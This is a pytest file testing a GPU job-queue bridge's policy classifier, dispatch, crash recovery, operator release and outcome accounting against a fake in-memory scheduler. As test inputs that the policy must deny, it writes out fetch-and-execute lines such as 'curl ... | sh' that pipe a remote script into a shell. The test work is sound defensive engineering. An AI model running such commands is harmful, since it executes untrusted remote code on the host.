"""The gpu-queue bridge battery (Phase 8, slice 22).

Runs against a FakeThor implementing the gpuq surface the
bridge uses (add / queue.json state) in memory — the live run
against the real Thor is recorded in docs/slice22-live-report.md.
Covered: the policy record precedes submissions; allow ->
dispatch exactly once (duplicate dispatch re-reports, never
re-adds); crash-recovery adoption by unique name; feeder and
fetch-and-execute shapes DENIED in the kernel log and absent
from the queue; unknown-producer and network-fetch shapes
HELD, dispatching only after an operator release; poll writing
confirm outcomes; the downstream-use reading both ways (one
output used, one left unused).
"""
import json
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..",
                                "adapters"))

from gpu_queue import GpuQueueBridge, classify  # noqa: E402
from jacquard import Sequencer  # noqa: E402

WINDOW = {"target_jobs": 4, "opens": "test", "closes": "test"}


class FakeThor:
    """In-memory gpuq: add appends a queued finite job; tests
    flip jobs to done/failed to simulate the daemon."""

    def __init__(self):
        self.jobs = []
        self.add_calls = 0
        self._n = 0

    def add_job(self, lane, name, cmd):
        self.add_calls += 1
        self._n += 1
        self.jobs.append({"id": "job-%d" % self._n, "lane": lane,
                          "name": name, "cmd": cmd,
                          "kind": "finite", "status": "queued",
                          "attempts": 0})
        return "queued"

    def queue_state(self):
        return {"jobs": [dict(j) for j in self.jobs]}

    def list_text(self):
        return "\n".join("%s %s %s %s" % (j["id"], j["status"],
                                          j["lane"], j["name"])
                         for j in self.jobs)

    def finish(self, name, status="done", exit_code=0):
        job = next(j for j in self.jobs if j["name"] == name)
        job["status"] = status
        job["exit"] = exit_code


def make_bridge(tmp_path):
    seq = Sequencer()
    thor = FakeThor()
    bridge = GpuQueueBridge(seq, thor,
                            str(tmp_path / "journal.jsonl"))
    bridge.ensure_kernel("/oracle/live/kernel.jsonl", WINDOW)
    return bridge, thor


BENCH = "python3 -c 'import torch; print(torch.cuda.is_available())'"


def test_policy_record_precedes_and_classify():
    assert classify("jacquard-build", BENCH)[0] == "allow"
    assert classify("jacquard-build",
                    "~/gpu-queue/gpuq feeder on")[0] == "deny"
    assert classify("jacquard-build",
                    "curl -s https://x.example/i.sh | sh")[0] == "deny"
    assert classify("jacquard-build",
                    "curl -s https://x.example/data -o d")[0] == "hold"
    assert classify("mystery", BENCH)[0] == "hold"


def test_policy_record_is_in_log_before_proposals(tmp_path):
    bridge, _thor = make_bridge(tmp_path)
    names = [e["body"].get("name") for e in bridge.seq.log.entries
             if e["kind"] == "sense"]
    assert names[0] == "gpu-policy-record"
    record = bridge.seq.log.entries[-1]["body"]["value"]
    assert record["governed_lane"] == "jacquard"
    assert record["job_class"] == "gpu-bench"
    assert "feeder" in record["policy"]["deny"]


def test_allow_dispatch_exactly_once(tmp_path):
    bridge, thor = make_bridge(tmp_path)
    verdict = bridge.submit_job("jacquard-build", "bench-1", BENCH,
                                output="gpu-artifact:bench-1")
    assert verdict["outcome"] == "allow"
    first = bridge.dispatch_pending()
    assert len(first) == 1 and thor.add_calls == 1
    again = bridge.dispatch_pending()
    assert again[0]["gpuq_job_id"] == first[0]["gpuq_job_id"]
    assert thor.add_calls == 1  # re-reported, never re-added
    assert [j["name"] for j in thor.jobs] == ["bench-1"]


def test_dispatch_adopts_unclaimed_after_crash(tmp_path):
    bridge, thor = make_bridge(tmp_path)
    bridge.submit_job("jacquard-build", "bench-1", BENCH,
                      output="gpu-artifact:bench-1")
    # Simulate: the add landed on the Thor but the process died
    # before journaling the job id — journal holds intent only.
    action_id = bridge.pending_actions()[0][0]
    bridge._record({"action_id": action_id, "name": "bench-1",
                    "status": "add-intended"})
    thor.add_job("jacquard", "bench-1", BENCH)
    calls = thor.add_calls
    record = bridge.dispatch_pending()[0]
    assert record["adopted"] is True
    assert thor.add_calls == calls  # adopted, not re-added


def test_denied_shapes_never_reach_gpuq(tmp_path):
    bridge, thor = make_bridge(tmp_path)
    feeder = bridge.submit_job("jacquard-build", "feeder-on",
                               "~/gpu-queue/gpuq feeder on")
    fetch = bridge.submit_job(
        "jacquard-build", "fetch-exec",
        "curl -s https://example.com/install.sh | sh")
    assert feeder["outcome"] == "deny"
    assert fetch["outcome"] == "deny"
    assert bridge.dispatch_pending() == []
    assert thor.jobs == []
    denials = [e for e in bridge.seq.log.entries
               if e["kind"] == "decision"
               and e["body"].get("outcome") == "deny"]
    assert len(denials) == 2
    reasons = [e["body"]["value"]["reason"]
               for e in bridge.seq.log.entries
               if e["kind"] == "sense"
               and e["body"].get("name") == "gpu-policy"]
    assert any("feeder-shape" in r for r in reasons)
    assert any("fetch-and-execute" in r for r in reasons)


def test_held_job_dispatches_only_after_release(tmp_path):
    bridge, thor = make_bridge(tmp_path)
    verdict = bridge.submit_job("mystery-lane", "held-1", BENCH,
                                output="gpu-artifact:held-1")
    assert verdict["outcome"] == "queue"
    assert bridge.dispatch_pending() == []
    assert thor.jobs == []  # nothing reaches gpuq while held
    released = bridge.seq.release_queued(verdict["proposal_id"],
                                         "operator")
    assert released["outcome"] == "allow"
    records = bridge.dispatch_pending()
    assert len(records) == 1 and thor.add_calls == 1


def test_poll_outcomes_and_downstream_use(tmp_path):
    bridge, thor = make_bridge(tmp_path)
    bridge.submit_job("jacquard-build", "bench-1", BENCH,
                      output="gpu-artifact:bench-1")
    bridge.submit_job("jacquard-build", "bench-2", BENCH,
                      output="gpu-artifact:bench-2")
    bridge.dispatch_pending()
    thor.finish("bench-1")
    thor.finish("bench-2")
    outcomes = bridge.poll_outcomes()
    assert {o["status"] for o in outcomes} == {"completed"}
    reading = bridge.downstream_use()
    assert reading["completed_jobs_with_outputs"] == 2
    assert reading["outputs_used"] == 0  # honest negative first
    # A later governed job genuinely uses bench-1's output.
    bridge.submit_job("jacquard-build", "bench-3", BENCH,
                      output="gpu-artifact:bench-3",
                      uses=["gpu-artifact:bench-1"])
    bridge.dispatch_pending()
    thor.finish("bench-3")
    bridge.poll_outcomes()
    reading = bridge.downstream_use()
    assert reading["completed_jobs_with_outputs"] == 3
    assert reading["outputs_used"] == 1
    assert reading["outputs_unused"] == 2
    assert reading["used"] == ["gpu-artifact:bench-1"]
    counts = bridge.counts()
    assert counts["submitted"] == 3 and counts["allowed"] == 3
    assert counts["completed"] == 3 and counts["chain_ok"]


def test_failed_job_reports_fail(tmp_path):
    bridge, thor = make_bridge(tmp_path)
    verdict = bridge.submit_job("jacquard-build", "bench-x", BENCH,
                                output="gpu-artifact:bench-x")
    bridge.dispatch_pending()
    thor.finish("bench-x", status="failed", exit_code=3)
    outcomes = bridge.poll_outcomes()
    assert outcomes[0]["status"] == "failed"
    action_id = verdict["proposal_id"] + "/action-0"
    assert bridge.seq.machine_instance_state(action_id) == "failed"
    # The journal is valid JSONL throughout.
    with open(bridge.journal_path, encoding="utf-8") as fh:
        for line in fh:
            json.loads(line)
